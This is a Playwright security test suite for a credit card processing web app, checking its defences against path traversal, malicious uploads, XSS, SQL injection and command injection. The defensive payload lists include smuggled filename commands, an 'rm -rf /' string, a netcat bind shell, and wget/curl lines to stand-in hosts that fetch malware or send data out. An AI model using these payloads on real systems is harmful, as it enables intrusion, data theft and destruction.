/**
 * Comprehensive Security Test Suite for Credit Card Processor
 * 
 * Tests cover:
 * 1. Path Traversal Prevention
 * 2. Session Hijacking Prevention  
 * 3. File Type Validation
 * 4. Input Sanitization
 * 5. CORS and Security Headers
 * 6. Authentication and Authorization
 * 7. XSS Prevention
 * 8. CSRF Protection
 */

import { test, expect } from '@playwright/test'
import path from 'path'

test.describe('Security Testing Suite', () => {
  let page

  test.beforeEach(async ({ browser }) => {
    page = await browser.newPage()
    
    // Set up legitimate authentication headers
    await page.setExtraHTTPHeaders({
      'x-dev-user': 'security-testuser',
      'x-user-context': 'security-testuser'
    })
    
    await page.goto('http://localhost:3000')
  })

  test.afterEach(async () => {
    await page?.close()
  })

  test.describe('Path Traversal Prevention', () => {
    test('prevents directory traversal in file uploads', async () => {
      await page.click('[data-testid="new-session-button"]')
      await page.fill('[data-testid="session-name-input"]', 'Security Test Session')
      await page.click('[data-testid="create-session-button"]')
      
      // Test various path traversal attempts
      const traversalAttempts = [
        '../../etc/passwd',
        '../../../windows/system32/config/sam',
        '....//....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..\\..\\..\\windows\\system.ini',
        'file.pdf; cat /etc/passwd',
        'file.pdf && rm -rf /',
        '/etc/passwd%00.pdf'
      ]
      
      for (const maliciousFilename of traversalAttempts) {
        // Create a mock PDF file with malicious filename
        await page.evaluate(async (filename) => {
          const content = '%PDF-1.4\n1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n%%EOF'
          const blob = new Blob([content], { type: 'application/pdf' })
          const file = new File([blob], filename, { type: 'application/pdf' })
          
          const input = document.querySelector('[data-testid="car-file-input"]')
          const dataTransfer = new DataTransfer()
          dataTransfer.items.add(file)
          input.files = dataTransfer.files
          input.dispatchEvent(new Event('change', { bubbles: true }))
        }, maliciousFilename)
        
        // Should either reject the file or sanitize the filename
        await page.waitForTimeout(1000) // Allow validation to process
        
        const fileStatus = await page.locator('[data-testid="car-file-status"]').textContent()
        const fileName = await page.locator('[data-testid="car-file-name"]').textContent()
        
        // File should be rejected OR filename should be sanitized
        const isRejected = fileStatus && fileStatus.includes('error')
        const isSanitized = fileName && !fileName.includes('..') && !fileName.includes('/') && !fileName.includes('\\')
        
        expect(isRejected || isSanitized).toBe(true)
      }
    })

    test('prevents path traversal in API endpoints', async () => {
      const traversalPaths = [
        '../../etc/passwd',
        '../../../config/database.yml',
        '....//....//etc//shadow',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64'
      ]
      
      for (const traversalPath of traversalPaths) {
        // Test path traversal in session API
        const response = await page.request.get(`/api/sessions/${traversalPath}`, {
          headers: {
            'x-dev-user': 'security-testuser',
            'x-user-context': 'security-testuser'
          }
        })
        
        // Should return 400, 404, or 422 - not expose file contents
        expect([400, 404, 422]).toContain(response.status())
        
        const responseText = await response.text()
        expect(responseText).not.toContain('root:')
        expect(responseText).not.toContain('password')
        expect(responseText).not.toContain('database')
      }
    })
  })

  test.describe('File Type Validation Security', () => {
    test('prevents execution of malicious files', async () => {
      await page.click('[data-testid="new-session-button"]')
      await page.fill('[data-testid="session-name-input"]', 'File Security Test')
      await page.click('[data-testid="create-session-button"]')
      
      // Test various malicious file types
      const maliciousFiles = [
        { name: 'malware.exe', content: 'MZ\x90\x00', type: 'application/octet-stream' },
        { name: 'script.js', content: 'alert("xss")', type: 'text/javascript' },
        { name: 'evil.bat', content: '@echo off\nformat c:', type: 'application/x-bat' },
        { name: 'trojan.com', content: 'malicious content', type: 'application/x-msdownload' },
        { name: 'virus.scr', content: 'screen saver virus', type: 'application/x-screensaver' },
        { name: 'polyglot.pdf.exe', content: '%PDF-1.4\nMZ\x90\x00', type: 'application/pdf' }
      ]
      
      for (const maliciousFile of maliciousFiles) {
        await page.evaluate(async (file) => {
          const blob = new Blob([file.content], { type: file.type })
          const uploadFile = new File([blob], file.name, { type: file.type })
          
          const input = document.querySelector('[data-testid="car-file-input"]')
          const dataTransfer = new DataTransfer()
          dataTransfer.items.add(uploadFile)
          input.files = dataTransfer.files
          input.dispatchEvent(new Event('change', { bubbles: true }))
        }, maliciousFile)
        
        await page.waitForTimeout(1000)
        
        // Should reject non-PDF files
        const fileStatus = await page.locator('[data-testid="car-file-status"]').textContent()
        expect(fileStatus).toContain('error')
      }
    })

    test('validates PDF file integrity', async () => {
      await page.click('[data-testid="new-session-button"]')
      await page.fill('[data-testid="session-name-input"]', 'PDF Security Test')
      await page.click('[data-testid="create-session-button"]')
      
      // Test corrupted PDF files
      const corruptedPDFs = [
        'Not a PDF file at all',
        '%PDF-1.4\nCorrupted content',
        '%PDF-1.4\n<script>alert("xss")</script>',
        '%PDF-1.4\n../../etc/passwd',
        'GIF89a\x00\x01\x00\x01', // GIF file with PDF extension
      ]
      
      for (const corruptedContent of corruptedPDFs) {
        await page.evaluate(async (content) => {
          const blob = new Blob([content], { type: 'application/pdf' })
          const file = new File([blob], 'corrupted.pdf', { type: 'application/pdf' })
          
          const input = document.querySelector('[data-testid="car-file-input"]')
          const dataTransfer = new DataTransfer()
          dataTransfer.items.add(file)
          input.files = dataTransfer.files
          input.dispatchEvent(new Event('change', { bubbles: true }))
        }, corruptedContent)
        
        await page.waitForTimeout(1000)
        
        // Should detect and reject corrupted PDFs
        const fileStatus = await page.locator('[data-testid="car-file-status"]').textContent()
        expect(fileStatus).toContain('error')
      }
    })

    test('prevents EICAR virus signature uploads', async () => {
      await page.click('[data-testid="new-session-button"]')
      await page.fill('[data-testid="session-name-input"]', 'Virus Test Session')
      await page.click('[data-testid="create-session-button"]')
      
      // EICAR test string (harmless but recognized by antivirus)
      const eicarContent = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
      
      await page.evaluate(async (content) => {
        const blob = new Blob([content], { type: 'application/pdf' })
        const file = new File([blob], 'test.pdf', { type: 'application/pdf' })
        
        const input = document.querySelector('[data-testid="car-file-input"]')
        const dataTransfer = new DataTransfer()
        dataTransfer.items.add(file)
        input.files = dataTransfer.files
        input.dispatchEvent(new Event('change', { bubbles: true }))
      }, eicarContent)
      
      await page.waitForTimeout(2000)
      
      // Should detect and reject EICAR signature
      const fileStatus = await page.locator('[data-testid="car-file-status"]').textContent()
      expect(fileStatus).toContain('error')
    })
  })

  test.describe('Input Sanitization', () => {
    test('sanitizes XSS attempts in session names', async () => {
      await page.click('[data-testid="new-session-button"]')
      
      const xssAttempts = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        'onmouseover="alert(1)"',
        '<iframe src="javascript:alert(1)">',
        '"><script>alert(1)</script>',
        '\';alert(1);//',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">'
      ]
      
      for (const xssPayload of xssAttempts) {
        await page.fill('[data-testid="session-name-input"]', xssPayload)
        
        // Input should be sanitized
        const inputValue = await page.inputValue('[data-testid="session-name-input"]')
        expect(inputValue).not.toContain('<script')
        expect(inputValue).not.toContain('javascript:')
        expect(inputValue).not.toContain('onerror')
        expect(inputValue).not.toContain('onload')
        expect(inputValue).not.toContain('<iframe')
        expect(inputValue).not.toContain('<object')
        expect(inputValue).not.toContain('<embed')
      }
    })

    test('sanitizes SQL injection attempts', async () => {
      await page.click('[data-testid="new-session-button"]')
      
      const sqlInjectionAttempts = [
        "'; DROP TABLE sessions; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' UNION SELECT * FROM users --",
        "'; DELETE FROM sessions; --",
        "' OR 1=1 --",
        "'; EXEC xp_cmdshell('format c:'); --",
        "' AND 1=(SELECT COUNT(*) FROM users) --"
      ]
      
      for (const sqlPayload of sqlInjectionAttempts) {
        await page.fill('[data-testid="session-name-input"]', sqlPayload)
        await page.click('[data-testid="create-session-button"]')
        
        // Should either sanitize input or handle gracefully without SQL injection
        const errorMessage = await page.locator('[data-testid="error-message"]').textContent()
        const successMessage = await page.locator('[data-testid="session-created-message"]').textContent()
        
        if (successMessage && successMessage.includes('successfully')) {
          // If session was created, verify the name was sanitized
          await page.click('[data-testid="sessions-list-link"]')
          const sessionsList = await page.locator('[data-testid="sessions-list"]').textContent()
          expect(sessionsList).not.toContain('DROP TABLE')
          expect(sessionsList).not.toContain('INSERT INTO')
          expect(sessionsList).not.toContain('DELETE FROM')
        }
        
        // Reset for next test
        if (await page.locator('[data-testid="new-session-button"]').isVisible()) {
          await page.click('[data-testid="new-session-button"]')
        }
      }
    })

    test('handles command injection attempts', async () => {
      await page.click('[data-testid="new-session-button"]')
      
      const commandInjectionAttempts = [
        '; cat /etc/passwd',
        '| rm -rf /',
        '&& format c:',
        '; wget http://malicious.com/malware',
        '`cat /etc/shadow`',
        '$(whoami)',
        '; curl -X POST http://evil.com/steal-data',
        '| nc -l -p 1234 -e /bin/bash'
      ]
      
      for (const commandPayload of commandInjectionAttempts) {
        await page.fill('[data-testid="session-name-input"]', `Test Session${commandPayload}`)
        await page.click('[data-testid="create-session-button"]')
        
        // Should sanitize command injection attempts
        const sessionName = await page.locator('[data-testid="current-session-name"]').textContent()
        if (sessionName) {
          expect(sessionName).not.toContain('cat ')
          expect(sessionName).not.toContain('rm -rf')
          expect(sessionName).not.toContain('wget ')
          expect(sessionName).not.toContain('curl ')
          expect(sessionName).not.toContain('nc -l')
        }
        
        // Reset
        if (await page.locator('[data-testid="new-session-button"]').isVisible()) {
          await page.click('[data-testid="new-session-button"]')
        }
      }
    })
  })

  test.describe('Authentication and Authorization Security', () => {
    test('prevents session hijacking through header manipulation', async () => {
      // Create a legitimate session
      await page.setExtraHTTPHeaders({
        'x-dev-user': 'legitimate-user',
        'x-user-context': 'legitimate-user'
      })
      
      await page.click('[data-testid="new-session-button"]')
      await page.fill('[data-testid="session-name-input"]', 'Legitimate Session')
      await page.click('[data-testid="create-session-button"]')
      
      const sessionId = await page.locator('[data-testid="session-id"]').textContent()
      
      // Now try to access with different user context
      await page.setExtraHTTPHeaders({
        'x-dev-user': 'malicious-user',
        'x-user-context': 'legitimate-user' // Mismatched headers
      })
      
      // Try to access the session
      const response = await page.request.get(`/api/sessions/${sessionId}`)
      
      // Should reject mismatched authentication headers
      expect([401, 403, 404]).toContain(response.status())
    })

    test('prevents privilege escalation', async () => {
      // Test regular user trying to access admin functions
      await page.setExtraHTTPHeaders({
        'x-dev-user': 'regular-user',
        'x-user-context': 'regular-user'
      })
      
      // Try to access admin-only endpoints
      const adminEndpoints = [
        '/api/admin/users',
        '/api/admin/sessions',
        '/api/admin/system-stats',
        '/api/admin/logs'
      ]
      
      for (const endpoint of adminEndpoints) {
        const response = await page.request.get(endpoint)
        
        // Should deny access to admin endpoints
        expect([401, 403, 404]).toContain(response.status())
      }
    })

    test('validates authentication header consistency', async () => {
      // Test with inconsistent authentication headers
      const inconsistentHeaders = [
        { 'x-dev-user': 'user1', 'x-user-context': 'user2' },
        { 'x-dev-user': 'admin', 'x-user-context': 'regular-user' },
        { 'x-dev-user': '', 'x-user-context': 'some-user' },
        { 'x-dev-user': 'user1', 'x-user-context': '' },
      ]
      
      for (const headers of inconsistentHeaders) {
        const response = await page.request.get('/api/sessions/', { headers })
        
        // Should reject inconsistent headers
        expect([400, 401, 422]).toContain(response.status())
      }
    })

    test('prevents user enumeration attacks', async () => {
      const testUsers = [
        'admin',
        'administrator',
        'root',
        'test',
        'user',
        'guest',
        'service',
        'nonexistent-user-12345'
      ]
      
      for (const username of testUsers) {
        const response = await page.request.get('/api/sessions/', {
          headers: {
            'x-dev-user': username,
            'x-user-context': username
          }
        })
        
        // All responses should be consistent to prevent user enumeration
        // Either all succeed (200) or all fail (401) with same message
        const responseTime = Date.now()
        expect([200, 401]).toContain(response.status())
        
        if (response.status() === 401) {
          const errorText = await response.text()
          // Error messages should not reveal whether user exists
          expect(errorText).not.toContain('user does not exist')
          expect(errorText).not.toContain('invalid user')
          expect(errorText).not.toContain('user not found')
        }
      }
    })
  })

  test.describe('CORS and Security Headers', () => {
    test('validates CORS configuration', async () => {
      // Test CORS headers with different origins
      const testOrigins = [
        'http://localhost:3000',
        'https://malicious.com',
        'http://evil.example.com',
        'null'
      ]
      
      for (const origin of testOrigins) {
        const response = await page.request.get('/api/health', {
          headers: { 'Origin': origin }
        })
        
        const corsHeader = response.headers()['access-control-allow-origin']
        
        if (origin === 'http://localhost:3000') {
          // Should allow legitimate origin
          expect([origin, '*']).toContain(corsHeader)
        } else {
          // Should not allow malicious origins
          expect(corsHeader).not.toBe(origin)
        }
      }
    })

    test('validates security headers presence', async () => {
      const response = await page.request.get('/api/health')
      const headers = response.headers()
      
      // Check for essential security headers
      expect(headers['x-content-type-options']).toBe('nosniff')
      expect(headers['x-frame-options']).toBeTruthy()
      expect(headers['x-xss-protection']).toBeTruthy()
      expect(headers['referrer-policy']).toBeTruthy()
      
      // Should not expose sensitive server information
      expect(headers['server']).not.toContain('Apache/')
      expect(headers['server']).not.toContain('nginx/')
      expect(headers['x-powered-by']).toBeFalsy()
    })

    test('prevents clickjacking attacks', async () => {
      // Check X-Frame-Options header
      const response = await page.request.get('/api/health')
      const frameOptions = response.headers()['x-frame-options']
      
      expect(['DENY', 'SAMEORIGIN']).toContain(frameOptions)
    })

    test('validates Content Security Policy', async () => {
      const response = await page.request.get('/')
      const cspHeader = response.headers()['content-security-policy']
      
      if (cspHeader) {
        // CSP should restrict inline scripts and external resources
        expect(cspHeader).toContain("script-src")
        expect(cspHeader).not.toContain("'unsafe-inline'")
        expect(cspHeader).not.toContain("'unsafe-eval'")
      }
    })
  })

  test.describe('XSS Prevention', () => {
    test('prevents reflected XSS in URL parameters', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        'onmouseover=alert(1)',
      ]
      
      for (const payload of xssPayloads) {
        await page.goto(`http://localhost:3000?search=${encodeURIComponent(payload)}`)
        
        // Check if XSS payload is executed
        let alertFired = false
        page.on('dialog', dialog => {
          alertFired = true
          dialog.accept()
        })
        
        await page.waitForTimeout(1000)
        expect(alertFired).toBe(false)
        
        // Check if payload is properly escaped in page content
        const pageContent = await page.content()
        expect(pageContent).not.toContain('<script>alert("xss")</script>')
      }
    })

    test('prevents stored XSS in user data', async () => {
      await page.click('[data-testid="new-session-button"]')
      
      const xssPayload = '<script>document.body.innerHTML="HACKED"</script>'
      await page.fill('[data-testid="session-name-input"]', xssPayload)
      await page.click('[data-testid="create-session-button"]')
      
      // Navigate to sessions list
      await page.click('[data-testid="sessions-list-link"]')
      
      // Check if XSS is executed
      await page.waitForTimeout(1000)
      const bodyContent = await page.locator('body').textContent()
      expect(bodyContent).not.toBe('HACKED')
      
      // Verify content is properly escaped
      const sessionsList = await page.locator('[data-testid="sessions-list"]').innerHTML()
      expect(sessionsList).not.toContain('<script>')
    })

    test('prevents DOM-based XSS', async () => {
      // Navigate with XSS payload in hash
      const xssHash = '#<script>alert("dom-xss")</script>'
      await page.goto(`http://localhost:3000${xssHash}`)
      
      let alertFired = false
      page.on('dialog', dialog => {
        alertFired = true
        dialog.accept()
      })
      
      await page.waitForTimeout(1000)
      expect(alertFired).toBe(false)
    })
  })

  test.describe('File Upload Security', () => {
    test('validates file size limits', async () => {
      await page.click('[data-testid="new-session-button"]')
      await page.fill('[data-testid="session-name-input"]', 'File Size Test')
      await page.click('[data-testid="create-session-button"]')
      
      // Create oversized file (simulate 200MB)
      await page.evaluate(async () => {
        const largeContent = new Array(200 * 1024 * 1024).fill('a').join('')
        const blob = new Blob([largeContent], { type: 'application/pdf' })
        const file = new File([blob], 'oversized.pdf', { type: 'application/pdf' })
        
        const input = document.querySelector('[data-testid="car-file-input"]')
        const dataTransfer = new DataTransfer()
        dataTransfer.items.add(file)
        input.files = dataTransfer.files
        input.dispatchEvent(new Event('change', { bubbles: true }))
      })
      
      await page.waitForTimeout(2000)
      
      // Should reject oversized files
      const fileStatus = await page.locator('[data-testid="car-file-status"]').textContent()
      expect(fileStatus).toContain('size')
      expect(fileStatus).toContain('error')
    })

    test('prevents zip bomb uploads', async () => {
      await page.click('[data-testid="new-session-button"]')
      await page.fill('[data-testid="session-name-input"]', 'Zip Bomb Test')
      await page.click('[data-testid="create-session-button"]')
      
      // Simulate a zip bomb (small file that expands to huge size)
      await page.evaluate(async () => {
        // Create a file that appears small but could expand
        const suspiciousContent = '%PDF-1.4\n' + 'A'.repeat(1000000) // Repetitive content
        const blob = new Blob([suspiciousContent], { type: 'application/pdf' })
        const file = new File([blob], 'zipbomb.pdf', { type: 'application/pdf' })
        
        const input = document.querySelector('[data-testid="car-file-input"]')
        const dataTransfer = new DataTransfer()
        dataTransfer.items.add(file)
        input.files = dataTransfer.files
        input.dispatchEvent(new Event('change', { bubbles: true }))
      })
      
      await page.waitForTimeout(3000)
      
      // Should detect and handle suspicious files
      const fileStatus = await page.locator('[data-testid="car-file-status"]').textContent()
      expect(['error', 'warning']).toContain(fileStatus?.toLowerCase() || '')
    })

    test('prevents metadata injection attacks', async () => {
      await page.click('[data-testid="new-session-button"]')
      await page.fill('[data-testid="session-name-input"]', 'Metadata Injection Test')
      await page.click('[data-testid="create-session-button"]')
      
      // Test filename with metadata injection
      const maliciousFilename = 'normal.pdf\x00malicious.exe'
      
      await page.evaluate(async (filename) => {
        const content = '%PDF-1.4\n1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n%%EOF'
        const blob = new Blob([content], { type: 'application/pdf' })
        const file = new File([blob], filename, { type: 'application/pdf' })
        
        const input = document.querySelector('[data-testid="car-file-input"]')
        const dataTransfer = new DataTransfer()
        dataTransfer.items.add(file)
        input.files = dataTransfer.files
        input.dispatchEvent(new Event('change', { bubbles: true }))
      }, maliciousFilename)
      
      await page.waitForTimeout(1000)
      
      // Should sanitize or reject malicious filename
      const displayedFilename = await page.locator('[data-testid="car-file-name"]').textContent()
      if (displayedFilename) {
        expect(displayedFilename).not.toContain('\x00')
        expect(displayedFilename).not.toContain('.exe')
      } else {
        // File was rejected
        const fileStatus = await page.locator('[data-testid="car-file-status"]').textContent()
        expect(fileStatus).toContain('error')
      }
    })
  })

  test.describe('Session Security', () => {
    test('prevents session fixation attacks', async () => {
      // Try to set a specific session ID
      await page.addInitScript(() => {
        localStorage.setItem('sessionId', 'attacker-controlled-session-id')
      })
      
      await page.reload()
      
      // Application should not use the attacker-controlled session ID
      const actualSessionId = await page.evaluate(() => localStorage.getItem('sessionId'))
      expect(actualSessionId).not.toBe('attacker-controlled-session-id')
    })

    test('validates session timeout', async () => {
      // Create a session
      await page.click('[data-testid="new-session-button"]')
      await page.fill('[data-testid="session-name-input"]', 'Timeout Test Session')
      await page.click('[data-testid="create-session-button"]')
      
      // Simulate expired session by manipulating time
      await page.addInitScript(() => {
        const originalDate = Date.now
        Date.now = () => originalDate() + (24 * 60 * 60 * 1000) // Add 24 hours
      })
      
      await page.reload()
      
      // Should prompt for re-authentication or show session expired
      const authRequired = await page.locator('[data-testid="auth-required"], [data-testid="session-expired"]').isVisible({ timeout: 5000 })
      expect(authRequired).toBe(true)
    })
  })

  test.describe('API Security', () => {
    test('prevents API endpoint enumeration', async () => {
      const commonEndpoints = [
        '/api/admin',
        '/api/users',
        '/api/config',
        '/api/debug',
        '/api/test',
        '/api/backup',
        '/api/logs'
      ]
      
      for (const endpoint of commonEndpoints) {
        const response = await page.request.get(endpoint)
        
        // Should not expose sensitive endpoints or detailed error info
        expect([404, 401, 403]).toContain(response.status())
        
        const responseText = await response.text()
        expect(responseText).not.toContain('stack trace')
        expect(responseText).not.toContain('Exception')
        expect(responseText).not.toContain('debug')
      }
    })

    test('validates rate limiting', async () => {
      const requests = []
      
      // Make rapid requests to test rate limiting
      for (let i = 0; i < 50; i++) {
        requests.push(
          page.request.get('/api/sessions/', {
            headers: {
              'x-dev-user': 'rate-limit-test',
              'x-user-context': 'rate-limit-test'
            }
          })
        )
      }
      
      const responses = await Promise.all(requests)
      const statusCodes = responses.map(r => r.status())
      
      // Some requests should be rate limited
      const rateLimitedRequests = statusCodes.filter(status => status === 429)
      expect(rateLimitedRequests.length).toBeGreaterThan(0)
    })
  })
})